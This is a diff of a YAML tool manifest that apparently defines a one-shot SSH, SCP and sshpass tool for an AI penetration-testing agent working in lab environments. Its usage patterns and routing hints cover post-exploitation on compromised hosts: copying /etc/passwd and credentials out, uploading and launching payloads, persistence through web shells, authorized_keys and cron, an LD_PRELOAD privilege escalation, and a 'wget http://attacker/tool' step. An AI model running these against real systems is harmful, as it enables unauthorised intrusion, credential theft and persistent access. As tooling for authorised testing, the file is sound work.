@@ -1,9 +1,111 @@
 name: ssh
+kind: cli
+# binary: omitted intentionally — ssh is a MULTI-BINARY toolkit. Each
+# usage_pattern below declares its own `binary:` field (ssh / scp / sshpass)
+# and tool_runner forwards the chosen binary explicitly to cli_in_container.
+# Mirror of impacket / forensics / smtp / snmp / ike-scan pattern.
+#
+#   ssh      OpenSSH 10.x — one-shot remote command exec (and the wrapper for
+#                            password auth via sshpass-prefixed argv)
+#                            ssh [flags] [user@]host [command]
+#                            -p PORT       remote SSH port
+#                            -i FILE       private key
+#                            -o KEY=VAL    SSH config option
+#                            -l USER       alternate user form
+#                            -F FILE       custom config
+#                            -c CIPHER     cipher
+#                            -J HOST       jump host
+#                            -T            no PTY
+#                            -q            quiet
+#                            -v / -vv      verbose
+#                            (-L/-R/-D/-N/-W are STATEFUL tunnel flags — see
+#                             reject_flags below; route to the `tunnel` tool)
+#
+#   scp      OpenSSH 10.x — one-shot file copy
+#                            scp [flags] SRC DST  (one or both can be user@host:path)
+#                            -P PORT       remote SSH port (CAPITAL P — ssh uses lowercase)
+#                            -i FILE       private key
+#                            -r            recursive directory copy
+#                            -3            transit through localhost
+#                            -O            legacy SCP protocol (vs SFTP, OpenSSH 9+ default)
+#                            -p            preserve mtime/atime/perms
+#                            -q            quiet
+#                            -v            verbose
+#
+#   sshpass  1.10        — wraps ssh/scp to inject a password
+#                            sshpass [flags] ssh-or-scp-command [args...]
+#                            -p PASS       password value (visible in `ps`)
+#                            -f FILE       password from file
+#                            -d FD         password from FD (3 by default)
+#                            -e            password from SSHPASS env var
+#                            -v            verbose
+#
+# All seven legacy method handlers (exec, shell, copy_from, copy_to,
+# upload_binary, run_script, background) auto-inherit run_cli from
+# BaseMCPServer (mcp-common 0.3.0). kind:cli is the new default; the seven
+# methods are preserved as the legacy / rollback path per SKILL #21. Each
+# legacy method opens a FRESH ssh / scp connection per call (one-shot) — no
+# state is held between calls. Persistent multi-command sessions are NOT in
+# scope for this tool; use the separate `shell-session` (kind:mcp) tool for
+# that.
+
 version: "1.0"
-description: "SSH client (OpenSSH 10.2p1 + sshpass 1.10) for remote command execution, file transfer, and script deployment on compromised hosts. 7 methods: exec (single command with retry), shell (sequential commands joined with &&), copy_from/copy_to (SCP text file transfer), upload_binary (base64 chunked binary upload), run_script (upload+execute+cleanup), and background (nohup/disown detached process with env var injection). Supports password auth (via sshpass), PEM private keys, and OpenSSH-format keys (auto-converted to PEM). Auto-retry on transient failures (timeout, connection reset) with exponential backoff. Classified error messages for connection refused, permission denied, timeout, no route. Accepts arbitrary ssh_options for legacy ciphers, KEX algorithms, and MTU workarounds."
+description: >
+  OpenSSH 10.x client + sshpass 1.10 for one-shot remote operations against
+  a host where you already have credentials. Three sub-binaries:
+
+    ssh      — execute a single remote command, with optional key or
+               password auth. PTY suppressed via -T for clean stdout
+               capture; -o StrictHostKeyChecking=no /
+               -o UserKnownHostsFile=/dev/null are LAB-ONLY defaults to
+               avoid first-connection prompts.
+
+    scp      — copy a single file or directory between local and remote
+               using the OpenSSH transport.
+
+    sshpass  — inject a password into ssh / scp from a flag (-p),
+               file (-f), FD (-d), or env var (-e / SSHPASS).
+
+  Common forms:
+
+    ssh -i /session/id_rsa -o StrictHostKeyChecking=no user@10.10.10.5 'whoami; id'
+    sshpass -p 'Password123' ssh -o StrictHostKeyChecking=no user@10.10.10.5 'cat /etc/passwd'
+    SSHPASS='Password123' sshpass -e ssh user@10.10.10.5 'sudo -l'
+    scp -i /session/id_rsa user@10.10.10.5:/etc/passwd /session/loot/passwd
+    scp -i /session/id_rsa /session/payload.sh user@10.10.10.5:/tmp/payload.sh
+    ssh -i /session/id_rsa user@10.10.10.5 'nohup /tmp/payload.sh >/dev/null 2>&1 &'
+
+  Stateful operations are OUT OF SCOPE for kind:cli: -L / -R / -D port
+  forwards (ssh tunnels — use the `tunnel` MCP tool); -N (no remote
+  command — only useful for tunnels); -W (forward to host). These are
+  rejected via `reject_flags`. Persistent multi-command shells are also
+  out of scope — use `shell-session` (kind:mcp).
+
+  Output is PURE TEXT on stdout: whatever the remote command emits. scp
+  emits brief progress on stderr (often nothing under -q). sshpass adds
+  no output of its own.
+
+  The seven legacy method handlers (exec, shell, copy_from, copy_to,
+  upload_binary, run_script, background) auto-inherit run_cli from
+  BaseMCPServer (mcp-common 0.3.0); kind:cli is the new default. The
+  legacy methods are preserved as the rollback path per SKILL #21.
+
 image: "ghcr.io/silicon-works/mcp-tools-ssh:latest"
 image_size_mb: 100
-timeout_seconds: 300
+
+# Dual-clock model:
+#   idle_timeout_seconds — silence between MCP heartbeats. ssh / scp emit
+#     output as the remote command produces it. 5 min silent generally means
+#     the remote command is genuinely slow OR the connection is wedged
+#     (server overloaded, network drop). Most one-shot SSH commands take
+#     <30s.
+#   max_runtime_seconds — hard wall-clock cap. 1 h covers worst-case file
+#     transfer over slow tun0 / VPN with a multi-MB payload (e.g., chisel
+#     binary upload). Most calls finish in seconds.
+idle_timeout_seconds: 300
+max_runtime_seconds: 3600
+timeout_seconds: 3600
+allow_multi_target: false       # one host per call
 
 capabilities:
   - remote_shell_access
@@ -23,356 +125,475 @@ resources:
   memory_mb: 128
   cpu: 0.25
 
-# Routing hints for tool selection
 routing:
   use_for:
-    - "execute commands on a compromised host via SSH"
-    - "upload exploits or tools to target via SCP"
-    - "download files from compromised target via SCP"
-    - "run enumeration scripts on remote host via SSH"
-    - "SSH access with discovered credentials or private keys"
-    - "start persistent background process on target"
-    - "upload compiled binary exploit to target"
-    - "environment variable injection for privilege escalation via SSH"
+    - "execute a single command on a compromised host via SSH (whoami; id; sudo -l)"
+    - "copy a file from a compromised target to /session via SCP (creds, configs, flags)"
+    - "upload a script or compiled binary to a compromised target via SCP"
+    - "upload-and-execute a small enum / privesc script in one shot via ssh + nohup"
+    - "test SSH access with discovered credentials (one-shot auth probe)"
+    - "run a single sudo / suid / cron-related enumeration command on a target"
+    - "kick off a detached process on the target (nohup / disown) that survives disconnect"
+    - "execute a sequence of commands joined with && or ; in a single SSH invocation"
   never_use_for:
-    - "SSH brute-force (use hydra)"
-    - "port scanning"
-    - "initial SSH connection test"
+    - "SSH brute-force — use hydra ssh:// or netexec ssh"
+    - "interactive multi-command shells — use the shell-session (kind:mcp) tool"
+    - "SSH tunneling / SOCKS proxy / port forwarding — use the tunnel (kind:mcp) tool"
+    - "SSH-based key cracking — use john's ssh2john + john / hashcat"
+    - "initial port discovery — use nmap"
+    - "TTY-required interactive tools (vi, less, htop) — kind:cli has no TTY"
   triggers:
-    - "SSH"
-    - "SCP"
+    - "ssh"
+    - "scp"
+    - "sshpass"
     - "remote command"
-    - "remote shell"
+    - "one-shot ssh"
     - "ssh exec"
+    - "scp upload"
+    - "scp download"
     - "ssh key"
+    - "ssh password"
     - "upload to target"
     - "download from target"
+    - "execute on target"
+    - "post-exploitation"
+    - "sudo -l via ssh"
+  prefer_over: []
 
-methods:
-  exec:
-    description: "Execute a single command on a remote host via SSH. Uses sshpass for password auth or temp key file for key auth. OpenSSH-format keys are auto-converted to PEM via ssh-keygen. Includes automatic retry (up to 2 retries) on transient failures (connection timeout, reset, network unreachable) with exponential backoff. SSH warnings (host key, 'Permanently added') are filtered from stderr. Returns classified error messages on failure (connection refused, permission denied, timeout, no route to host)."
-    when_to_use: "The primary method for running commands on a host after gaining SSH credentials. Use for: (1) Post-exploitation enumeration — run 'id', 'whoami', 'uname -a', 'cat /etc/passwd', (2) Checking sudo permissions — 'sudo -l', (3) Searching for flags or sensitive files — 'find / -name user.txt 2>/dev/null', (4) Running single recon commands before uploading full scripts. For multiple sequential commands, use shell instead. For multi-line scripts, use run_script. For persistent processes, use background."
-    params:
-      host:
-        type: string
-        required: true
-        description: "Target hostname or IP address."
-      username:
-        type: string
-        required: true
-        description: "SSH username (e.g., 'root', 'www-data', discovered user)."
-      password:
-        type: string
-        description: "SSH password. Uses sshpass for non-interactive password auth. Provide either password or key, not both."
-      key:
-        type: string
-        description: "Private key content as string (PEM or OpenSSH format). OpenSSH keys ('BEGIN OPENSSH PRIVATE KEY') are auto-converted to PEM format. Written to temp file with 0600 permissions, deleted after use."
-      command:
-        type: string
-        required: true
-        description: "Shell command to execute on the remote host."
-      port:
-        type: integer
-        default: 22
-        description: "SSH port. Change for non-standard SSH ports discovered by nmap."
-      timeout:
-        type: integer
-        default: 30
-        description: "Total timeout in seconds for connection + command execution. Increase for slow commands or high-latency targets."
-      ssh_options:
-        type: string
-        description: "Additional SSH options as a single string, parsed via shlex. Examples: '-o KexAlgorithms=diffie-hellman-group14-sha256' for legacy servers, '-o Ciphers=aes256-cbc' for old SSH versions, '-o StrictHostKeyChecking=no' (already set by default)."
-    returns:
-      exit_code:
-        type: integer
-        description: "Command exit code (0=success, non-zero=failure, 255=SSH connection error)."
-      stdout:
-        type: string
-        description: "Command standard output."
-      stderr:
-        type: string
-        description: "Command standard error (SSH warnings filtered out)."
+see_also:
+  - tool: shell-session
+    reason: "Use shell-session (kind:mcp) for PERSISTENT multi-command SSH sessions where state matters across commands (cd, env vars, set -x). This `ssh` tool opens a FRESH connection per call — every invocation starts from $HOME with no shell state. If the agent finds itself running 4+ ssh calls in a row against the same host with related state (cd into a dir, then ls, then cat, then mv), pivot to shell-session for one persistent session."
+  - tool: tunnel
+    reason: "Use tunnel (kind:mcp) for SSH-based port forwarding (-L local, -R remote, -D dynamic / SOCKS) and stateful tunnels. The `-L`, `-R`, `-D`, and `-N` flags are REJECTED by this `ssh` tool's reject_flags because they require a long-running ssh process; cli_in_container's one-shot model can't keep them alive."
+  - tool: hydra
+    reason: "Use hydra ssh://host for credential brute-forcing or password spraying. This `ssh` tool requires KNOWN credentials (key or password); hydra discovers them. Once hydra surfaces a working pair, hand them to ssh / scp for one-shot exec or sshpass for password-auth file copy."
+  - tool: netexec
+    reason: "Use netexec ssh -u USER -p PASS -x 'command' HOST for credential validation across many SSH targets in parallel. netexec is faster than ssh for spraying; ssh is the deeper-enumeration tool once a credential pair is confirmed."
+  - tool: john
+    reason: "Use ssh2john to convert an encrypted SSH private key into a john-crackable hash. Once cracked, decrypt the key with the recovered passphrase and pass to ssh -i."
+  - tool: nmap
+    reason: "Run nmap -p 22 -sV before SSH to confirm the port is open AND running OpenSSH (vs Dropbear, libssh, custom). Some legacy services on port 22 reject standard OpenSSH KEX algorithms — nmap's banner reveals which."
 
-  shell:
-    description: "Execute multiple commands in sequence on a remote host. Commands are joined with '&&' (each command must succeed for the next to run) and sent as a single SSH exec. Uses the same retry and error handling as exec. Returns combined stdout from all commands."
-    when_to_use: "When you need to run several related commands in order, such as: (1) Post-exploitation info gathering — ['id', 'whoami', 'cat /etc/os-release', 'uname -a'], (2) File system exploration — ['ls -la /home', 'ls -la /var/www', 'ls -la /opt'], (3) Setup steps — ['mkdir -p /tmp/.work', 'cd /tmp/.work', 'wget http://attacker/tool']. Commands are joined with &&, so if any command fails the chain stops. For independent commands that should all run regardless, use exec with ';' separator instead."
-    params:
-      host:
-        type: string
-        required: true
-        description: "Target hostname or IP address."
-      username:
-        type: string
-        required: true
-        description: "SSH username."
-      password:
-        type: string
-        description: "SSH password."
-      key:
-        type: string
-        description: "Private key content (PEM or OpenSSH format, auto-converted)."
-      commands:
-        type: array
-        required: true
-        description: "List of commands to execute in order. Joined with '&&' — chain stops on first failure."
-      port:
-        type: integer
-        default: 22
-        description: "SSH port."
-      timeout:
-        type: integer
-        default: 60
-        description: "Total timeout for the entire command chain."
-      ssh_options:
-        type: string
-        description: "Additional SSH options string."
-    returns:
-      exit_code:
-        type: integer
-        description: "Exit code of the last executed command in the chain."
-      stdout:
-        type: string
-        description: "Combined stdout from all commands."
+# ── kind:cli specific sections ──────────────────────────────────────
 
-  copy_from:
-    description: "Download a text file from a remote host via SCP. Transfers the file to a local temp file, reads the content as text (with error replacement for binary bytes), and returns the content as a string. For binary files, use exec with 'base64 <file>' and decode locally instead."
-    when_to_use: "To retrieve text files from a compromised target: (1) Configuration files — /etc/passwd, /etc/shadow, ssh keys from ~/.ssh/, (2) Application configs — database credentials, .env files, wp-config.php, (3) Flags — user.txt, root.txt, (4) Log files — /var/log/auth.log, application logs, (5) Source code for analysis. Returns file content as a string. Not suitable for large binary files — use exec with base64 encoding for those."
-    params:
-      host:
-        type: string
-        required: true
-        description: "Target hostname or IP address."
-      username:
-        type: string
-        required: true
-        description: "SSH username."
-      password:
-        type: string
-        description: "SSH password."
-      key:
-        type: string
-        description: "Private key content (PEM or OpenSSH format, auto-converted)."
-      remote_path:
-        type: string
-        required: true
-        description: "Absolute path to the file on the remote host (e.g., '/etc/shadow', '/home/user/user.txt')."
-      port:
-        type: integer
-        default: 22
-        description: "SSH port."
-      timeout:
-        type: integer
-        default: 60
-        description: "Transfer timeout in seconds."
-      ssh_options:
-        type: string
-        description: "Additional SSH options string."
-    returns:
-      content:
-        type: string
-        description: "File contents as text."
-      size:
-        type: integer
-        description: "File size in bytes."
+target_extraction:
+  # ssh / scp / sshpass take the host in `[user@]host[:path]` positional form.
+  # The host is captured from group 2 of the regex (group 1 is the optional
+  # user@ prefix).
+  #
+  # Examples that should match:
+  #   ssh user@10.10.10.5 'whoami'                           → host = 10.10.10.5
+  #   ssh root@target.htb 'id'                               → host = target.htb
+  #   ssh -i key.pem ec2-user@bastion.example.com 'date'     → host = bastion.example.com
+  #   ssh 10.10.10.5 'uptime'                                → host = 10.10.10.5  (no user)
+  #   scp file user@10.10.10.5:/tmp/                         → host = 10.10.10.5
+  #   scp user@10.10.10.5:/etc/passwd /local/passwd          → host = 10.10.10.5
+  #   sshpass -p pass ssh user@10.10.10.5 'whoami'           → host = 10.10.10.5
+  #
+  # The regex carefully:
+  #   - Optionally consumes `user@`        (^([^@\s]+@)?)
+  #   - Captures the host                  ([^:/?#\s]+)
+  #   - Stops at :path / ? / # / whitespace
+  #
+  # value_flags below ensure -i KEY / -o OPT / -p PORT / -F CONFIG values are
+  # NOT misread as positional targets.
+  - rule: "positional_match"
+    pattern: '^([^@\s]+@)?([^:/?#\s]+)'
+    group: 2
+    parse_as: "raw"
 
-  copy_to:
-    description: "Upload text content to a remote host via SCP. Writes content to a local temp file, transfers via scp to the remote path. For text-based uploads: scripts, configs, web shells, cron entries. For binary uploads, use upload_binary instead."
-    when_to_use: "To upload text content to a compromised target: (1) Upload enumeration scripts (linpeas.sh, linenum.sh) for privilege escalation, (2) Plant web shells in web-accessible directories, (3) Upload SSH authorized_keys for persistent access, (4) Write cron entries for persistence, (5) Upload configuration files for tool setup. For binary files (compiled exploits, ELF binaries), use upload_binary instead."
-    params:
-      host:
-        type: string
-        required: true
-        description: "Target hostname or IP address."
-      username:
-        type: string
-        required: true
-        description: "SSH username."
-      password:
-        type: string
-        description: "SSH password."
-      key:
-        type: string
-        description: "Private key content (PEM or OpenSSH format, auto-converted)."
-      content:
-        type: string
-        required: true
-        description: "Text content to upload (scripts, configs, web shells, etc.)."
-      remote_path:
-        type: string
-        required: true
-        description: "Destination path on remote host (e.g., '/tmp/linpeas.sh', '/var/www/html/shell.php')."
-      port:
-        type: integer
-        default: 22
-        description: "SSH port."
-      timeout:
-        type: integer
-        default: 60
-        description: "Transfer timeout in seconds."
-      ssh_options:
-        type: string
-        description: "Additional SSH options string."
-    returns:
-      size:
-        type: integer
-        description: "Uploaded content size in bytes."
+# Stateful flags that cannot work under cli_in_container (one-shot model;
+# no persistent ssh process to keep a tunnel alive). Routed to the `tunnel`
+# kind:mcp tool instead.
+reject_flags:
+  - "-L"      # local port forward (ssh -L 8080:localhost:80 user@host)
+  - "-R"      # remote port forward (ssh -R 8080:localhost:80 user@host)
+  - "-D"      # dynamic SOCKS proxy (ssh -D 1080 user@host)
+  - "-N"      # no remote command (only useful in conjunction with -L/-R/-D)
+  - "-W"      # forward to host:port (ProxyJump-style; stateful)
+  - "-M"      # control master (sets up a persistent multiplex socket)
+  - "-S"      # control socket path (used with -M; persistent)
+  - "-O"      # control commands (check/exit/forward — only meaningful with -M)
+reject_flags_reason: >
+  ssh -L, -R, -D, -N, -W, -M, -S, -O are STATEFUL operations: they require
+  the ssh process to keep running for the duration of the tunnel / control
+  master. cli_in_container is one-shot — the process exits as soon as the
+  remote command returns, killing any tunnel. For persistent tunneling /
+  port forwarding / SOCKS, use the dedicated `tunnel` (kind:mcp) tool.
+  Note: scp's `-O` means "use legacy SCP protocol" (totally different from
+  ssh's `-O`); scp invocations are unaffected by this reject because the
+  reject_flags are scoped per-binary in the cli_in_container parser.
 
-  upload_binary:
-    description: "Upload a binary file to a remote host via base64 chunked transfer over SSH. Splits the binary into 50KB chunks, base64-encodes each chunk, and appends to the remote file via 'echo <chunk> | base64 -d >> <path>'. Optionally makes the file executable (chmod +x, default true). Verifies upload with 'ls -la' and 'file' commands. Requires base64 on the remote host (present on virtually all Linux systems)."
-    when_to_use: "To upload compiled exploits, ELF binaries, or other non-text files to a compromised target. Common uses: (1) Upload a compiled C exploit (kernel exploit, SUID exploit) built locally or via exploit-runner, (2) Upload a statically-compiled tool (nmap, socat, chisel) for pivoting, (3) Upload a reverse shell binary, (4) Upload pspy for process monitoring. The chunking approach works even when SCP is blocked but SSH exec works. For text files (scripts, configs), use copy_to instead — it's simpler."
-    params:
-      host:
-        type: string
-        required: true
-        description: "Target hostname or IP address."
-      username:
-        type: string
-        required: true
-        description: "SSH username."
-      password:
-        type: string
-        description: "SSH password."
-      key:
-        type: string
-        description: "Private key content (PEM or OpenSSH format, auto-converted)."
-      content_base64:
-        type: string
-        required: true
-        description: "Binary file content as base64-encoded string."
-      remote_path:
-        type: string
-        required: true
-        description: "Destination path on remote host (e.g., '/tmp/exploit', '/dev/shm/chisel')."
-      executable:
-        type: boolean
-        default: true
-        description: "Run chmod +x on the file after upload. Default true."
-      chunk_size:
-        type: integer
-        default: 50000
-        description: "Chunk size for transfer in bytes (before base64 encoding)."
-      port:
-        type: integer
-        default: 22
-        description: "SSH port."
-      timeout:
-        type: integer
-        default: 300
-        description: "Total timeout for all chunks. 300s default handles multi-MB files."
-      ssh_options:
-        type: string
-        description: "Additional SSH options string."
-    returns:
-      size:
-        type: integer
-        description: "Total uploaded file size in bytes."
-      chunks:
-        type: integer
-        description: "Number of chunks transferred."
-      verified:
-        type: boolean
-        description: "Whether upload was verified via ls and file commands."
+# Per-tool value-taking flags whose values must NOT be confused with the
+# positional `[user@]host` argument. Verified against:
+#   - `ssh -h`        (OpenSSH 10.2p1 on Kali rolling, 2026-04)
+#   - `scp -h`        (OpenSSH 10.2p1 on Kali rolling)
+#   - `sshpass -h`    (sshpass 1.10)
+value_flags:
+  # ── ssh: connection / auth ──
+  - "-p"                  # ssh: remote port (NB: scp uses -P; sshpass -p means PASSWORD — see below)
+  - "-i"                  # ssh / scp: private key path
+  - "-o"                  # ssh / scp: -o KEY=VALUE config option
+  - "-c"                  # ssh / scp: cipher
+  - "-l"                  # ssh: alternate user form (ssh -l user host)
+  - "-F"                  # ssh / scp: custom config file
+  - "-J"                  # ssh: jump host (-J [user@]host[:port][,...])
+  - "-b"                  # ssh / scp: bind address (local source IP)
+  - "-B"                  # ssh: bind interface
+  - "-e"                  # ssh: escape character (default ~ — set to 'none' for stdin handling)
+  - "-I"                  # ssh: PKCS#11 provider library
+  - "-Q"                  # ssh: query algorithms (-Q cipher / mac / kex / key / sig)
+  - "-w"                  # ssh: tun device pair (tun forwarding — listed for safety)
+  # ── ssh / scp: boolean (listed so the parser doesn't misread the next
+  # argv token as a value) ──
+  - "-q"                  # quiet
+  - "-T"                  # no PTY
+  - "-X"                  # X11 forward (stateful but harmless for one-shot)
+  - "-Y"                  # trusted X11 forward
+  - "-A"                  # agent forward (stateful but harmless)
+  - "-a"                  # disable agent forward
+  - "-C"                  # ssh: compression (NB: scp -C also compression; same letter, same meaning)
+  - "-g"                  # ssh: allow remote-host bind for forwards (stateful)
+  - "-K"                  # ssh: GSSAPI auth + delegate
+  - "-k"                  # ssh: disable GSSAPI ticket forward
+  - "-n"                  # ssh: redirect stdin from /dev/null
+  - "-s"                  # ssh: subsystem invocation (e.g., -s sftp)
+  - "-t"                  # ssh: force PTY (opposite of -T) — listed so parser handles it
+  - "-V"                  # ssh: print version
+  - "-v"                  # ssh / scp: verbose
+  - "-x"                  # ssh: disable X11 forward
+  - "-y"                  # ssh: send log to syslog
+  - "-4"                  # IPv4 only
+  - "-6"                  # IPv6 only
+  - "-G"                  # ssh: print effective config (no connect)
+  - "-N"                  # listed both as value_flag (boolean) and reject_flag — reject takes precedence
+  # ── scp specific ──
+  - "-3"                  # scp: route via localhost
+  - "-P"                  # scp: remote port (CAPITAL P — ssh uses lowercase -p for port)
+  - "-r"                  # scp: recursive copy
+  - "-O"                  # scp: legacy SCP protocol (NB: also rejected for ssh — but scp meaning is different)
+  - "-p"                  # scp: preserve mtime/atime/perms (NB: ssh -p is port; sshpass -p is password)
+  - "-D"                  # scp: explicit SCP daemon path (NB: also rejected for ssh dynamic-forward — different meaning)
+  - "-T"                  # scp: disable strict filename checking
+  # ── sshpass specific ──
+  # NB: sshpass -p means PASSWORD (a value-taking flag); ssh -p means PORT;
+  # scp -p means PRESERVE-PERMS (boolean). Same flag letter, three different
+  # meanings across the three binaries. The cli_in_container parser is
+  # binary-scoped — at parse time the binary is fixed, so the same letter
+  # disambiguates correctly.
+  # The entries below cover sshpass's flag set; -p is already listed above.
+  - "-f"                  # sshpass: password from file
+  - "-d"                  # sshpass: password from FD
+  # boolean: -e (env), -v (verbose) — already listed above
 
-  run_script:
-    description: "Upload a script to /tmp on the remote host via SCP, make it executable, execute it with the specified interpreter, and delete the temp file afterward. Combines copy_to + exec in one call. Script runs with the SSH user's permissions. Returns stdout, stderr, and exit code."
-    when_to_use: "For running multi-line scripts that are too complex for exec or shell. Common uses: (1) Run custom enumeration scripts — check for SUID binaries, writable directories, cron jobs, (2) Run linpeas.sh or linenum.sh content directly (paste script content, no need to wget), (3) Execute multi-step privilege escalation chains, (4) Run Python scripts on the target for exploitation. Use interpreter='/usr/bin/python3' for Python scripts, '/bin/sh' for POSIX-compatible scripts."
-    params:
-      host:
-        type: string
-        required: true
-        description: "Target hostname or IP address."
-      username:
-        type: string
-        required: true
-        description: "SSH username."
-      password:
-        type: string
-        description: "SSH password."
-      key:
-        type: string
-        description: "Private key content (PEM or OpenSSH format, auto-converted)."
-      script:
-        type: string
-        required: true
-        description: "Full script content to upload and execute."
-      interpreter:
-        type: string
-        default: "/bin/bash"
-        description: "Script interpreter path. Common: '/bin/bash', '/bin/sh', '/usr/bin/python3', '/usr/bin/perl'."
-      port:
-        type: integer
-        default: 22
-        description: "SSH port."
-      timeout:
-        type: integer
-        default: 120
-        description: "Execution timeout in seconds."
-      ssh_options:
-        type: string
-        description: "Additional SSH options string."
-    returns:
-      exit_code:
-        type: integer
-        description: "Script exit code."
-      stdout:
-        type: string
-        description: "Script standard output."
-      stderr:
-        type: string
-        description: "Script standard error."
+usage_patterns:
+  # ── ssh: one-shot remote command exec ──
+  - name: "ssh — single command, key auth"
+    binary: "ssh"
+    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'whoami; id; uname -a'"
+    when: "Canonical post-exploitation enumeration: confirm credentials work + grab basic identity. -T disables PTY for clean stdout (kind:cli has no TTY); -o StrictHostKeyChecking=no + -o UserKnownHostsFile=/dev/null are LAB-ONLY defaults to skip first-connection prompts. Quote the command to keep multi-statement chains intact."
 
-  background:
-    description: "Execute a detached background process on a remote host that survives SSH session disconnect. Uses nohup + disown to ensure persistence. Supports environment variable injection (exported before the command), output file capture, PID file writing, and a check command for verifying the process later. Environment variables are exported via 'export KEY=VALUE && ...' prefix."
-    when_to_use: "For processes that must persist after the SSH connection ends. Key use cases: (1) LD_PRELOAD or PYTHONPATH injection exploits — set env={'LD_PRELOAD': '/tmp/evil.so'} and run a SUID binary, (2) Race condition exploits — start a persistent process while racing in another SSH session, (3) Start a reverse shell listener or file watcher on the target, (4) Run long-running enumeration (pspy, tcpdump) with output capture. Use pid_file to track the process and return_check_command=true to get a 'ps -p <pid>' command for later status checks."
-    params:
-      host:
-        type: string
-        required: true
-        description: "Target hostname or IP address."
-      username:
-        type: string
-        required: true
-        description: "SSH username."
-      command:
-        type: string
-        required: true
-        description: "Command to run in the background. Wrapped in 'nohup bash -c \"...\" & disown'."
-      password:
-        type: string
-        description: "SSH password."
-      key:
-        type: string
-        description: "Private key content (PEM or OpenSSH format, auto-converted)."
-      port:
-        type: integer
-        default: 22
-        description: "SSH port."
-      env:
-        type: object
-        description: "Environment variables to export before running the command. Each key-value pair becomes 'export KEY=VALUE'. Use for LD_PRELOAD, PYTHONPATH, PATH manipulation exploits."
-      output_file:
-        type: string
-        description: "Remote file path to capture stdout/stderr. Without this, output goes to /dev/null."
-      pid_file:
-        type: string
-        description: "Remote file path to write the process PID. Enables later process management (kill, status check)."
-      return_check_command:
-        type: boolean
-        default: false
-        description: "If true, returns a 'ps -p <pid>' command string for verifying the process is still running."
-      ssh_options:
-        type: string
-        description: "Additional SSH options string."
-    returns:
-      success:
-        type: boolean
-        description: "Whether the background process was started successfully."
-      pid:
-        type: string
-        description: "Process ID (only if pid_file was specified)."
-      output_file:
-        type: string
-        description: "Path to the output capture file."
-      check_command:
-        type: string
-        description: "Command to verify process status (only if return_check_command=true)."
+  - name: "ssh — single command, key auth, custom port"
+    binary: "ssh"
+    command: "-p {port} -i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'sudo -l'"
+    when: "Same as the previous pattern but with a non-standard SSH port (often 2222, 22022, or whatever nmap surfaces). NB: ssh's port flag is LOWERCASE -p; scp's is CAPITAL -P; sshpass's -p is PASSWORD. Easy to typo."
+
+  - name: "ssh — multi-command via &&"
+    binary: "ssh"
+    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'cd /tmp && pwd && ls -la && find . -name flag.txt 2>/dev/null'"
+    when: "Run several commands in sequence in ONE SSH connection. Use && (stop on first failure) or ; (run all regardless). Quote the whole chain. The legacy `shell` method joined argv lists with && — under run_cli the LLM joins them itself."
+
+  - name: "ssh — IdentitiesOnly + custom key permissions workaround"
+    binary: "ssh"
+    command: "-i /session/id_rsa -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'cat ~/.ssh/authorized_keys'"
+    when: "Force ssh to use ONLY the supplied key (ignoring any agent / default key). Critical when the container has multiple keys in /session/ or when ssh-agent is forwarded. -o IdentitiesOnly=yes also bypasses the 'WARNING: UNPROTECTED PRIVATE KEY FILE' refusal when chmod 600 isn't possible (e.g., when the key was written by the wrong UID inside cli_in_container)."
+
+  - name: "ssh — verbose for connection diagnostics"
+    binary: "ssh"
+    command: "-vvv -i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'true' 2>/session/ssh-vvv.log"
+    when: "Triple-verbose dumps the full handshake: KEX algorithms, host key, auth methods offered, channel setup. Useful when a connection works locally but fails inside cli_in_container (often a KEX mismatch, MTU / VPN issue, or modern key-format rejection). Captures stderr separately to avoid flooding stdout."
+
+  - name: "ssh — KEX / cipher fallback for legacy servers"
+    binary: "ssh"
+    command: "-o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /session/id_rsa -T {user}@{host} 'whoami'"
+    when: "Connecting to a legacy SSH server (CentOS 6, old IOS, embedded device) where modern OpenSSH 10.x has dropped support for the KEX / host-key / pubkey types the server speaks. Re-enable specific weak algorithms via -o ...=+ALG. NB: + adds, = replaces."
+
+  - name: "ssh + sshpass — password auth via flag"
+    binary: "sshpass"
+    command: "-p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'whoami'"
+    when: "Non-interactive password auth. sshpass -p puts the password on the command line (visible in `ps` / audit logs) — for HTB / lab use it's the simplest form. The argv is `sshpass -p PASS ssh ...` — sshpass execs ssh with the password injected at the right time."
+
+  - name: "ssh + sshpass — password from env (SSHPASS)"
+    binary: "sshpass"
+    command: "-e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'whoami'"
+    when: "Read the password from the SSHPASS env var (set in the cli_in_container env, NOT on the command line). Cleaner than -p for audit logs because the password isn't visible in /proc/<pid>/cmdline. The agent must set SSHPASS via the container env at call time (cli_in_container's env passthrough)."
+
+  - name: "ssh + sshpass — password from file"
+    binary: "sshpass"
+    command: "-f /session/.password ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'whoami'"
+    when: "Read the password from a file under /session/. Useful when password contains shell-special chars that are awkward to quote. File must be readable by the container user."
+
+  - name: "ssh — kick off a detached background process"
+    binary: "ssh"
+    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'nohup /tmp/payload.sh > /tmp/payload.log 2>&1 & disown && echo BACKGROUND_STARTED'"
+    when: "Start a process on the target that survives the SSH disconnect. Use nohup + & + disown together; redirect output to a file (NOT a pipe — pipes are tied to the SSH session and would close). The legacy `background` method wrapped this; under run_cli the LLM constructs the bash chain. Echo a sentinel string to confirm the launch happened."
+
+  - name: "ssh — environment variable injection (LD_PRELOAD / PYTHONPATH)"
+    binary: "ssh"
+    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'export LD_PRELOAD=/tmp/evil.so && /usr/bin/sudo whoami'"
